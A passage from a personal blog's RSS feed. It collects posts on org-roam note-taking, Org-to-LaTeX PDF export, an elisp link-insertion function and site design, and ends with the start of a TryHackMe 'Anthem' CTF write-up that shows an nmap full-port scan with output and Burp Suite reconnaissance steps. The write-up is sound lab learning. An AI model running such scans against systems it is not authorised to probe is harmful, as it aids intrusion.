</p>

<p>
After attending a lecture, reading an article or a book, or when trying to
connect some concepts I have trouble with together, I start breaking everything
down to smaller notes. Through this process (and <code>org-roam-ui</code> helps), I often get
a much better view of the section I am studying at the time, understanding the
relationship between different pieces of theory and connecting them to real life
practices or material that has been previously studied. It is not perfect, but
it is helpful.
</p>


<p>
This gif perfectly illustrates the relationship between book, lecture
notes(left) and permanent notes(right)
Summing permanent notes up, through a lot of trial and error I have come to
believe that they should follow these policies.
</p>
</div>
<div id="outline-container-orgc29d8dd" class="outline-3">
<h3 id="orgc29d8dd"><span class="section-number-3">7.1.</span> <a href="#orgc29d8dd">KIS(S)</a></h3>
<div class="outline-text-3" id="text-7-1">
<p>
Keep it Small. I&rsquo;m trying really hard not to sum this section up as: &ldquo;Size
matters&rdquo;. My sense of humor, though, prevents me.
</p>

<p>
I have a principle of trying to keep my note files as small and as consistent as
possible. So far I am not doing a <i>great</i> job on the second, but I try really hard
on the first one: If my notes are not of bibliographic nature, I try to limit
them so that they can be fully contained in my computer screen. <sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
</p>

<p>
And funnily enough, with these we have actually covered all of the <i>theory</i> around my workflow.
</p>
</div>
</div>
<div id="outline-container-orgcbd3326" class="outline-3">
<h3 id="orgcbd3326"><span class="section-number-3">7.2.</span> <a href="#orgcbd3326">KIS(S)</a></h3>
<div class="outline-text-3" id="text-7-2">
<p>
Keep It Simple. Try to avoid overthinking or over engineering stuff. You should
focus on the material you are at the time studying or working on. Focusing on
the practice of note taking (even though, as (<a href="#orgf597d3d">Ahrens 2022</a>)
suggest is beneficial due to its deliberate character), is from my experience
problematic and hinders the process in the long term, by decreasing your
performance and willingness to take notes.
</p>
</div>
</div>
</div>
<div id="outline-container-org465d135" class="outline-2">
<h2 id="org465d135"><span class="section-number-2">8.</span> <a href="#org465d135">References</a></h2>
<div class="outline-text-2" id="text-8">
<p>
<a id="org996bd4d"></a>
</p>


<p>
<a id="orga6f808f"></a> <a id="orgf597d3d"></a>Ahrens, Sönke. 2022. <i>How to Take Smart Notes: One Simple Technique to Boost Writing, Learning and Thinking</i>. 2nd edition, revised and expanded edition. Hamburg, Germany: Sönke Ahrens.
</p>

<p>
<a id="org3684e44"></a>Castel, Gilles. 2023. “Castel.Dev.” Accessed March 8. <a href="https://castel.dev/">https://castel.dev/</a>.
</p>

<p>
<a id="org49fd70d"></a>Jethro, Kuan. 2023. “How I Take Notes with Org-roam.” Accessed January 20. <a href="https://jethrokuan.github.io/org-roam-guide/">https://jethrokuan.github.io/org-roam-guide/</a>.
</p>

<p>
<a id="org32c6870"></a>“Capturing Notes Efficiently with Org Roam - System Crafters.” 2023. Accessed March 9. <a href="https://systemcrafters.net/build-a-second-brain-in-emacs/capturing-notes-efficiently/">https://systemcrafters.net/build-a-second-brain-in-emacs/capturing-notes-efficiently/</a>.
</p>

<p>
<a id="orged04b20"></a>“Org-Roam User Manual.” 2023. Accessed March 9. <a href="https://www.orgroam.com/manual.html">https://www.orgroam.com/manual.html</a>.
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
I will try to write package specific workflow articles in the upcoming
months, but this sadly has no priority for me.
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Mind you, I&rsquo;m using <code>auto-fill-mode</code>, greatly limiting the width of my
files so the height limitation is quite apparent at times.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Beautiful and simple pdf-latex exports with org mode</title>
<link>posts/20230406_beautiful_and_simple_pdf_latex_exports_with_org_mode.html</link>
<pubDate>Thu, 06 Apr 2023 15:28:00 +0300</pubDate>
<guid>posts/20230406_beautiful_and_simple_pdf_latex_exports_with_org_mode.html</guid>
<description>
<![CDATA[<div id="outline-container-orgf95d09f" class="outline-2">
<h2 id="orgf95d09f"><span class="section-number-2">1.</span> <a href="#orgf95d09f">Disclaimer</a></h2>
<div class="outline-text-2" id="text-1">
<div class="note" id="org689480a">
<p>
Cringineer will surely like this one :P
</p>

</div>

<p>
If you also find yourself writing a lot of essays and assignments in org-mode,
taking advantage of its nearly natural syntax, but the end result, when
exporting to PDF, disappoints you, this article is for you.
</p>
</div>
</div>
<div id="outline-container-org5eb6622" class="outline-2">
<h2 id="org5eb6622"><span class="section-number-2">2.</span> <a href="#org5eb6622">A trip down memory lane</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Historically, there were many different many different solutions to producing a
scientific paper, or publishing any kind of digital document, for that matter.
</p>

<p>
Initially what mattered most was the document&rsquo;s final appearance on paper,
making programs such as <a href="https://en.wikipedia.org/wiki/Roff_(software)">roff</a>, quite popular. I mean, I remember like yesterday
studying the legendary book duo of <i>The Unix Programming Environment</i> and <i>The C
Programming Language</i>, which were (if I&rsquo;m not mistaken) using a roff derivative.
Aren&rsquo;t they beautiful?
</p>

<p>
However, roff and its derivatives had their limitations. In a <a href="https://www.youtube.com/watch?v=82TxNejKsng">computerphile
youtube video</a>, some time in the past I remember professor Brailsford taking
about the sheer difficulty of working with mathematics in that environment<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>

<p>
Another alternative was Donald Knuth&rsquo;s TeX. Being too young for that, I have
only played around with its only(?) still usable derivative: LaTeX. That
system is so powerful, you can create presentations, papers, cvs, all in a very
smooth and straightforward manner.
</p>

<p>
I sincerely believe it to be the most versatile way of writing any type of
documents, however, it has a relatively steep learning curve.
</p>
</div>
</div>
<div id="outline-container-org733f412" class="outline-2">
<h2 id="org733f412"><span class="section-number-2">3.</span> <a href="#org733f412">Introduction: An Org vs LaTeX comparison</a></h2>
<div class="outline-text-2" id="text-3">
<p>
LaTeX might be more than simply wonderful as a publication backend, with
templates being freely available on the Internet, but it is not so <i>easy</i> to write
in<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup> - mainly because for most of us, LaTeX will most probably be used only
once in a while and that will force us to <i>revise</i> or search online for stuff that
we once knew how to do.
</p>

<p>
This is where <code>org-mode</code> and <code>org-export</code> comes in.
</p>

<p>
The Org ecosystem is a wonderful environment. It is the main feature that keeps
me using Emacs instead of moving back to my simpler roots. It is a plain text
format with the simplest syntax I have ever seen out there, many times easier
and more intuitive than markdown, full of interesting features and constantly
improved, due to the plethora of experienced Org users out there, through a
suite of rather helpful complementary packages to make your life even easier.
</p>

<p>
From snippets, to inline LaTeX for mathematics, to inline images for more
difficult subjects, to syncing notes with books&#x2026; I mean, what more is there to
do??
</p>

<p>
<i>(This would be also a good point in the article to say the following: <b>Org is fun
to work in</b> )</i>
</p>

<p>
Back to what I promised, <code>org-mode</code> is not a LaTeX replacement and it was never
meant to be. Its consistency and standardized format is what makes it so useful
for producing pretty documents: it can be exported to many different formats:
LaTeX (and thus PDFs), html (this blog is powered by Org), markdown&#x2026; 
</p>

<p>
Let&rsquo;s see what exactly is needed for a seamless LaTeX experience within Org.
</p>
</div>
</div>
<div id="outline-container-orgf8ca8a6" class="outline-2">
<h2 id="orgf8ca8a6"><span class="section-number-2">4.</span> <a href="#orgf8ca8a6">Configuring Emacs</a></h2>
<div class="outline-text-2" id="text-4">
<div class="note" id="orgfdb9899">
<p>
At this point one should have some basic level understanding of customizing
Emacs. If you use a different way of installing packages, my snippets should be
modified. The logic behind them, however, remains the same.
</p>

</div>

<p>
In general, almost everything I describe here can be achieved on a vanilla Emacs
installation, since Org ships with Emacs. No need to overcomplicate things.
</p>

<p>
There is only one package I only find myself using <i>way too much</i> when writing in
Org-mode, and that is CDLatex, by the creator of <code>org-mode</code>. I&rsquo;ll try to publish
an article on it soon, comparing it to snippet managers and providing an
analysis on how I have integrated it into my more general workflow, allowing for
seamless LaTeX snippets inside of Org.
</p>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">use-package</span> cdlatex
    <span class="org-builtin">:hook</span> (org-mode . org-cdlatex-mode))
</pre>
</div>

<p>
What it essentially allows us to do is treat the buffer as a mix of LaTeX and
Org, easily utilizing the first one&rsquo;s math commands (and more detailed at times)
syntax. For example this
</p>

<div class="org-src-container">
<pre class="src src-tex"><span class="org-keyword">\begin</span>{<span class="org-function-name">equation</span>}
E = mc
<span class="org-keyword">\end</span>{<span class="org-function-name">equation</span>}
</pre>
</div>

<div class="note" id="orgdb5f210">
<p>
And you could preview that while in buffer with <code>C-c C-x C-l</code>
</p>

</div>

<p>
Would give us:
</p>
\begin{equation}
E = mc
\end{equation}
</div>
</div>
<div id="outline-container-orgd975889" class="outline-2">
<h2 id="orgd975889"><span class="section-number-2">5.</span> <a href="#orgd975889">Writing in Org</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Now we open an Emacs buffer pointing to an Org file (a plain text file with the
<code>.org</code> extension).
</p>

<div class="note" id="org85f7ee6">
<p>
If you want a refresher on Org syntax, you may like this one <a href="https://nhigham.com/2017/11/02/org-mode-syntax-cheat-sheet/">org-mode cheatsheet</a>
</p>

</div>

<p>
You will need to set some headers up top. These provide information for the rest
of the document, and the most basic ones are the following (these are actually
the ones used for this article):
</p>
<div class="org-src-container">
<pre class="src src-org"><span class="org-org-document-info-keyword">#+TITLE:</span> <span class="org-org-document-title">Beautiful and simple pdf-latex exports with org mode</span>
<span class="org-org-document-info-keyword">#+DATE:</span> <span class="org-org-document-info">&lt;2023-04-06 15:28&gt;</span>
<span class="org-org-meta-line">#+DESCRIPTION: C'est la vie ;; feel free to use better decriptions</span>
<span class="org-org-meta-line">#+FILETAGS: emacs org-mode </span>
</pre>
</div>

<p>
You can find more options to set, such as the following ones, but I generally
only set these before I export to LaTeX. 
</p>
<div class="org-src-container">
<pre class="src src-org"><span class="org-org-document-info-keyword">#+SUBTITLE:</span>  <span class="org-org-document-info">dunno</span>
<span class="org-org-document-info-keyword">#+AUTHOR:</span> <span class="org-org-document-info">chatziiola</span>
<span class="org-org-meta-line">#+LANGUAGE: el ;; Obviously this one is not needed if you are not writing Greek</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org82d167e" class="outline-2">
<h2 id="org82d167e"><span class="section-number-2">6.</span> <a href="#org82d167e">The LaTeX part</a></h2>
<div class="outline-text-2" id="text-6">
<p>
There are more specific options, that essentially modify the behavior (or
certain aspects) of the export process you choose. In our case, since we are
interested in LaTeX export, the main options to set are the following:
</p>

<div class="org-src-container">
<pre class="src src-org"><span class="org-org-meta-line">#+latex_class_options: [a4paper,11pt]</span>
<span class="org-org-meta-line">#+latex_compiler: xelatex</span>
<span class="org-org-meta-line">#+latex_header: \input{/path/to/sample.tex}</span>
</pre>
</div>

<p>
The first one specifies the paper and font size for our LaTeX export and is in
fact the optional argument that will get passed at the <code>\documentclass{article}</code>
statement at the beginning of our <i>exported</i> LaTeX buffer.
</p>

<p>
The second one, changes the default latex compiler to <code>xelatex</code>, something rather
unnecessary for most, but really helpful to those of us who regularly use
characters of more than one language in their documents, since the <code>polyglossia</code>
package makes it unbelievably easy.<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup>
</p>

<p>
The third one, is how you can turn a <i>decent</i> looking PDF (the one that gets
exported by default) into one that is tailored to your liking.
</p>
</div>
<div id="outline-container-orga7123de" class="outline-3">
<h3 id="orga7123de"><span class="section-number-3">6.1.</span> <a href="#orga7123de">The LaTeX template: <code>sample.tex</code></a></h3>
<div class="outline-text-3" id="text-6-1">
<p>
<code>sample.tex</code> needs to follow some properties. First of all, unlike any (template)
LaTeX document you may have worked on, it <b>must not</b> start with <code>\documentclass</code>.
</p>

<p>
There will simply be an <code>\input</code> statement in the LaTeX buffer that will get
created by the export process. That <code>\input</code> statement essentially translates to
all of <code>sample.tex</code>&rsquo;s contents being merged inside your document at the LaTeX
compilation stage.
</p>

<p>
A very simple such <code>tex</code> file, that not only gets the job done, but results in an
aesthetically pleasing result is the following. 
</p>

<div class="org-src-container">
<pre class="src src-tex">
<span class="org-comment-delimiter">% </span><span class="org-comment">Set up document layout</span>
<span class="org-keyword">\usepackage</span>{<span class="org-builtin">geometry</span>}
<span class="org-keyword">\geometry</span>{
  margin=1.5cm,
  includeheadfoot
}

<span class="org-comment-delimiter">% </span><span class="org-comment">Set up fonts</span>
<span class="org-keyword">\usepackage</span>{<span class="org-builtin">fontspec</span>}
<span class="org-keyword">\setmainfont</span>{Avenir Next}
<span class="org-keyword">\setmonofont</span>{Avenir Next}
<span class="org-keyword">\newfontfamily\greekfont</span>{Avenir Next}

<span class="org-comment-delimiter">% </span><span class="org-comment">Set up colors</span>
<span class="org-keyword">\usepackage</span>{<span class="org-builtin">xcolor</span>}
<span class="org-keyword">\definecolor</span>{myblue}{RGB}{19,64,140}
<span class="org-keyword">\definecolor</span>{myblack}{RGB}{0,0,0}
<span class="org-keyword">\definecolor</span>{linkblue}{RGB}{19,64,140}

<span class="org-comment-delimiter">% </span><span class="org-comment">Set up hyperlinks</span>
<span class="org-keyword">\usepackage</span>{<span class="org-builtin">hyperref</span>}
<span class="org-keyword">\hypersetup</span>{
  colorlinks=true,
  linkcolor=linkblue,
  filecolor=linkblue,
  urlcolor=linkblue,
}

<span class="org-comment-delimiter">% </span><span class="org-comment">Set up headers and footers</span>
<span class="org-keyword">\usepackage</span>{<span class="org-builtin">fancyhdr</span>}
<span class="org-keyword">\pagestyle</span>{fancy}
<span class="org-keyword">\fancyhf</span>{}
<span class="org-keyword">\fancyhead</span>[L]{<span class="org-keyword">\textcolor</span>{myblue}{<span class="org-keyword">\rightmark</span>}}
<span class="org-keyword">\fancyfoot</span>[C]{<span class="org-keyword">\textcolor</span>{myblack}{<span class="org-keyword">\thepage</span>}}

<span class="org-comment-delimiter">% </span><span class="org-comment">Set up section/subsection/chapter titles</span>
<span class="org-keyword">\usepackage</span>{<span class="org-builtin">titlesec</span>}
<span class="org-keyword">\titleformat</span>{<span class="org-keyword">\section</span>}
  {<span class="org-keyword">\normalfont\Large\bfseries</span><span class="org-bold"><span class="org-keyword">\color</span></span><span class="org-bold">{myblue}</span>}{<span class="org-keyword">\thesection</span>}{1em}{}
<span class="org-keyword">\titleformat</span>{<span class="org-keyword">\subsection</span>}
  {<span class="org-keyword">\normalfont\large\bfseries</span><span class="org-bold"><span class="org-keyword">\color</span></span><span class="org-bold">{myblue}</span>}{<span class="org-keyword">\thesubsection</span>}{1em}{}
<span class="org-keyword">\titleformat</span>{<span class="org-keyword">\subsubsection</span>}
  {<span class="org-keyword">\normalfont\normalsize\bfseries</span><span class="org-bold"><span class="org-keyword">\color</span></span><span class="org-bold">{myblue}</span>}{<span class="org-keyword">\thesubsubsection</span>}{1em}{}
<span class="org-keyword">\titleformat</span>{<span class="org-keyword">\chapter</span>}[display]
  {<span class="org-keyword">\normalfont\huge\bfseries</span><span class="org-bold"><span class="org-keyword">\color</span></span><span class="org-bold">{myblue}</span>}{<span class="org-keyword">\chaptertitlename</span>\ <span class="org-keyword">\thechapter</span>}{20pt}{<span class="org-keyword">\Huge</span>}
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-orgfe30484" class="outline-2">
<h2 id="orgfe30484"><span class="section-number-2">7.</span> <a href="#orgfe30484">Exporting</a></h2>
<div class="outline-text-2" id="text-7">
<p>
At that point, if you have a document that has an appropriately created list of
header options (<code>#+</code> statements), and a suitable <code>sample.tex</code> file, you are ready to
create your own beautiful documents:
</p>
<ol class="org-ol">
<li><code>C-c C-e</code> while you are on your document&rsquo;s buffer</li>
<li><code>l</code> to select the LaTeX submenu</li>
<li><code>o</code> to export as a PDF file and open it upon completion</li>
</ol>

<p>
Your PDF file will be there waiting for you.
</p>



<p>
Feel free to play around the process, modifying the tex file to create a
template to your liking. If you have any questions or have found some
inconsistencies and mistakes in the article, feel free to add a comment with
them. 
</p>
</div>
</div>
<div id="outline-container-orga916a76" class="outline-2">
<h2 id="orga916a76"><span class="section-number-2">8.</span> <a href="#orga916a76">Further reading:</a></h2>
<div class="outline-text-2" id="text-8">
<p>
You may also want to have a look at <a href="posts/20230309_a_practical_note_taking_system.html">my notetaking system</a> setup. I&rsquo;m trying to
build a detailed analysis of that system before I implement a <i>series</i>
functionality in this blog. This article will, then, be part of the <i>notetaking
in emacs</i> series.
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
There also exists this <a href="https://www.youtube.com/watch?v=XvwNKpDUkiE">video</a>, which provides a deeper analysis of the
subject
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Do not get me wrong, for simple texts (the kind that you&rsquo;ll use <code>org-mode</code>
for) the syntax is straightforward enough. The main advantage to Org is
consistency, the ability to use the same format to create notes for yourself, to
write blog posts, to practice literate programming, to produce pdfs and
presentations&#x2026;
</p></div></div>

<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3" role="doc-backlink">3</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
You can not understand how difficult this is unless you try it.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Org-roam selective link insertion</title>
<link>posts/20230527_org_roam_selective_link_insertion.html</link>
<pubDate>Sat, 27 May 2023 22:35:00 +0300</pubDate>
<guid>posts/20230527_org_roam_selective_link_insertion.html</guid>
<description>
<![CDATA[<div id="outline-container-orgc25b9b7" class="outline-2">
<h2 id="orgc25b9b7"><span class="section-number-2">1.</span> <a href="#orgc25b9b7">Disclaimer</a></h2>
<div class="outline-text-2" id="text-1">
<p>
This article does not cover how to use <code>org-roam</code>. It is simply a step by step
analysis of a potentially sketchy solution to overcome a niche problem. 
</p>

<p>
If anyone wants to write their own <code>org-roam</code> configuration, I would suggest
that they visit <a href="https://github.com/jethrokuan/dots">Jethro&rsquo;s dotfiles</a>.
</p>

<p>
While most mortals are still learning how to use it efficiently, occasionally
falling in the trap of overthinking stuff, while trying to practice Zettelkasten
as a means to get better in our pursuits, he seems to have all this figured out.
After all he is the creator of the package.
</p>
</div>
</div>
<div id="outline-container-orgf548831" class="outline-2">
<h2 id="orgf548831"><span class="section-number-2">2.</span> <a href="#orgf548831">Problem at hand</a></h2>
<div class="outline-text-2" id="text-2">
<p>
If there is something I always wanted to tackle in <code>org-roam</code>, is that I quite
often, when revisiting older nodes, encounter phrases and/or topics I have built
on since then. Manually fixing these <i>missing links</i> has been quite a burden.
</p>

<p>
That functionality, was not very difficult to achieve.
</p>
</div>
</div>
<div id="outline-container-org84484fa" class="outline-2">
<h2 id="org84484fa"><span class="section-number-2">3.</span> <a href="#org84484fa">Solution&#xa0;&#xa0;&#xa0;<span class="tag"><span class="elisp">elisp</span></span></a></h2>
<div class="outline-text-2" id="text-3">
<p>
The solution consists of two parts:
</p>
<ul class="org-ul">
<li>The function that does everything</li>
<li>The keybinding to use :P</li>
</ul>

<p>
Focusing on the hard stuff first: the function. Since I am an <a href="https://github.com/emacs-evil/evil">evil user</a>, I use
<code>visual mode</code> quite a lot, and it feels like the perfect tool for this job.
Whenever I find a snippet I want to replace with a link to the related node, I
can easily press <code>v</code>, select the appropriate text and then call the function.
</p>

<div class="note" id="orge3b4523">
<p>
If you do not use evil, you can still use the function (after commenting out the
last line). The usage will necessarily be different though.
</p>

</div>

<p>
Upon selection of text in emacs the text&rsquo;s starting and ending points are marked with
<code>(region-beginning)</code> and <code>(region-end)</code>, respectively. Knowing just those two we can
easily select the desired string: 
</p>

<div class="org-src-container">
<pre class="src src-elisp" id="orgb66dd80">(buffer-substring-no-properties (region-beginning) (region-end))
</pre>
</div>

<p>
Normally, that would be all, but to make my life a little bit easier, due to my
<i>bad</i> (?) habit of using solely the <code>w</code> and not the <code>e</code> motion, I wanted to
automatically strip the selected string of any undesired whitespace.
This step improves the accuracy of the subsequent processing
</p>

<div class="org-src-container">
<pre class="src src-elisp" id="org459c99c">(string-trim-whitespace (buffer-substring-no-properties (region-beginning) (region-end)))
</pre>
</div>

<p>
Having the selected text in the proper form, we then want to search our <code>org-roam</code>
database for the proper node. If such a node exists, we want to get it&rsquo;s <code>id</code> so
that we can then insert the link in our starting file.
</p>

<div class="org-src-container">
<pre class="src src-elisp" id="org5391f82">(<span class="org-keyword">progn</span>
  <span class="org-comment-delimiter">;; </span><span class="org-comment">Open a node-find prompt with the selected-text as initial input</span>
  <span class="org-comment-delimiter">;; </span><span class="org-comment">If a node is found/created open it on a different window</span>
  (org-roam-node-find t selected-text)
  <span class="org-comment-delimiter">;; </span><span class="org-comment">If the previous part runs as it is supposed</span>
  <span class="org-comment-delimiter">;; </span><span class="org-comment">get the id of the file we want to link to</span>
  (org-roam-node-id (org-roam-node-at-point)))
</pre>
</div>

<div class="note" id="org959139d">
<p>
Interestingly, the node need not actually match that selected text - we can clear it all in the
<code>org-roam-node-find</code> prompt, and simply insert a link for the node we want
</p>

</div>

<p>
We&rsquo;re getting there. So far, we have both selected the text, properly formatted
it, and then found/created the node we want the text to point to. The only thing
left here is to replace the plain text with a link to our <i>target node</i>.
</p>

<div class="org-src-container">
<pre class="src src-elisp" id="org225bd40">(<span class="org-keyword">with-current-buffer</span> current-buffer
            (<span class="org-keyword">progn</span>
              (goto-char re-start)
              (delete-region re-start (search-forward selected-text))
              (insert (concat <span class="org-string">"</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">[</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">[ID:"</span> id <span class="org-string">"</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">]</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">["</span> selected-text <span class="org-string">"</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">]</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">]"</span>))
              (evil-force-normal-state)
              ))
</pre>
</div>


<p>
Now, let&rsquo;s put it all together. 
</p>

<div class="org-src-container">
<pre class="src src-elisp" id="org7cd9ab6">(<span class="org-keyword">defun</span> <span class="org-function-name">my-org-roam-node-find-selected-text</span> ()
  <span class="org-doc">"Open org-roam-node-find with selected text as initial input</span>
<span class="org-doc">and replace with org-roam link if node is selected or created."</span>
  (<span class="org-keyword">interactive</span>)
    (<span class="org-keyword">let*</span> ((re-start (region-beginning))
           (selected-text (string-trim-whitespace (buffer-substring-no-properties re-start (region-end))))
           (current-buffer (current-buffer))
           (id (<span class="org-keyword">progn</span>
                 (org-roam-node-find t selected-text)
                 (org-roam-node-id (org-roam-node-at-point)))))
      (<span class="org-keyword">if</span>  (not (eq current-buffer (current-buffer)))
          (<span class="org-keyword">with-current-buffer</span> current-buffer
            (<span class="org-keyword">progn</span>
              (goto-char re-start)
              (delete-region re-start (search-forward selected-text))
              (insert (concat <span class="org-string">"</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">[</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">[ID:"</span> id <span class="org-string">"</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">]</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">["</span> selected-text <span class="org-string">"</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">]</span><span class="org-string"><span class="org-warning">\</span></span><span class="org-string">]"</span>))
              (evil-force-normal-state)
              ))
      )
    )
  )
</pre>
</div>


<p>
Now as far as the keybinding itself is concerned, there is no reason to analyze
it. <code>R</code> (for Roam) in visual mode points to a command I do not remember myself ever using
(and frankly, of little use I suppose), so I can safely change it to something
much more helpful. 
</p>
<div class="org-src-container">
<pre class="src src-elisp" id="org88bed17">(define-key evil-visual-state-map (kbd <span class="org-string">"R"</span>) 'my-org-roam-node-find-selected-text) 
</pre>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>On this site's design</title>
<link>posts/20230611_on_this_sites_design.html</link>
<pubDate>Mon, 22 Jan 2024 00:00:00 +0200</pubDate>
<guid>posts/20230611_on_this_sites_design.html</guid>
<description>
<![CDATA[<p>
I have devoted way more time than I would like to admit, thinking of
how this blog looks and behaves<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>. It is simple, smooth and minimal,
just like I wanted it to be, yet I can not stop thinking that it does
not feel that way: It feels more like a remnant of the past<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>.
</p>

<p>
It definitely stands out from the norm, embracing a <i>less is more</i>
philosophy, implemented through the absence of images and vibrant
visuals. I am extremely proud of that, not only because of its
practicality, but because of its subjective timelessness.
</p>

<p>
Fonts really matter and I think that picking this one last year change
completely changed the look of the site. It is a welcome change,
because this one was actually the only thing I wanted to change for
some time but never got around to doing.
</p>

<p>
At the end of the day, it does not matter if a site does not have
vibrant images for every post, or if the plain text format does not
really allow for emojis to put some more color. It is beautiful as it
is.
</p>

<p>
After all, we&rsquo;re chasing simplicity.
</p>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Sadly, I spent much of that time thinking of what other people,
especially in the tech field might say of such a brutal and
minimalistic blog, without many of the features already present in
other personal websites I&rsquo;ve seen&#x2026;   
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
And it is, a tribute to older computer forums and websites, to
people and groups that inspired me both as a computer geek and as
someone interested in keeping safe all that warrants protection.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>THM: Anthem</title>
<link>posts/20231021_thm_anthem.html</link>
<pubDate>Sat, 21 Oct 2023 10:30:00 +0300</pubDate>
<guid>posts/20231021_thm_anthem.html</guid>
<description>
<![CDATA[<p>
After a long time of not messing around with any CTFs, I decided to
give <a href="https://tryhackme.com/room/anthem">anthem</a> a shot and see how far I could go on my own. 
</p>
<div id="outline-container-org6267ec2" class="outline-2">
<h2 id="org6267ec2"><span class="section-number-2">1.</span> <a href="#org6267ec2">Reconnaissance</a></h2>
<div class="outline-text-2" id="text-1">
</div>
<div id="outline-container-orgf5239aa" class="outline-3">
<h3 id="orgf5239aa"><span class="section-number-3">1.1.</span> <a href="#orgf5239aa">Port Scanning</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
First things first, let&rsquo;s try to get some information about the target
machine, checking all ports and saving the output for future use:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orga70275b">sudo nmap -sSV -p- 10.10.201.121 -oA nmap.out -T4
</pre>
</div>

<pre class="example" id="org7705f00">
Starting Nmap 7.60 ( https://nmap.org ) at 2023-10-21 08:34 BST
Nmap scan report for ip-10-10-201-121.eu-west-1.compute.internal (10.10.201.121)
Host is up (0.00045s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
MAC Address: 02:20:2B:0A:0A:AD (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 458.11 seconds
</pre>

<p>
Checking the output we see that there are two services worth noting:
</p>
<ul class="org-ul">
<li>A web server at 80</li>
<li>An RDP server at 3389 (the protocol was not known to me, but
googling it gives us this answer)</li>
</ul>

<p>
Getting some more information from the web server can not hurt.
</p>
</div>
</div>
<div id="outline-container-org44162bf" class="outline-3">
<h3 id="org44162bf"><span class="section-number-3">1.2.</span> <a href="#org44162bf">Web Analysis</a></h3>
<div class="outline-text-3" id="text-1-2">
<p>
I always like to use burp suite (or zap for that matter), when I first
start interacting with a website. It saves me the trouble of manually
checking the HTML contents of each page (in case I want to do it), and
also maps quite nicely the target host.
</p>

<ul class="org-ul">
<li class="on"><code>[X]</code> Launch BurpSuite</li>
<li class="on"><code>[X]</code> Properly set FoxyProxy to burp, allowing us to intercept the traffic</li>
<li class="on"><code>[X]</code> Turn intercept off</li>
<li class="on"><code>[X]</code> Visit target machine&rsquo;s website</li>
<li class="on"><code>[X]</code> Go to Burp/Target, set the given machine as in scope, limiting
what Burp stores, making for a relatively clutter-free environment</li>
<li class="on"><code>[X]</code> Start moving</li>
</ul>

<div class="note" id="org5b6c6d2">
<p>
Using <a href="https://github.com/hakluke/hakrawler">https://github.com/hakluke/hakrawler</a> while passing all the
traffic through Burp&rsquo;s proxy might also be beneficial, but at this
point I like manually checking every page.
</p>

</div>
</div>
<div id="outline-container-org89f307e" class="outline-4">
<h4 id="org89f307e"><span class="section-number-4">1.2.1.</span> <a href="#org89f307e">Random Findings</a></h4>
<div class="outline-text-4" id="text-1-2-1">
<p>
While randomly clicking everywhere I could find, I got to the page of
a writer (Jane Doe), which included a flag at a suspiciously obvious
location. 
</p>


<div id="orgd9c330b" class="figure">
<p><img src="posts/images/20231021_105049_screenshot.png" alt="20231021_105049_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>A flag :P</p>
</div>
</div>
</div>
<div id="outline-container-org4efd16e" class="outline-4">
<h4 id="org4efd16e"><span class="section-number-4">1.2.2.</span> <a href="#org4efd16e">Robots.txt, Security.txt, Sitemap.xml</a></h4>
<div class="outline-text-4" id="text-1-2-2">
<p>
Visiting those files is a must when checking websites (even though the
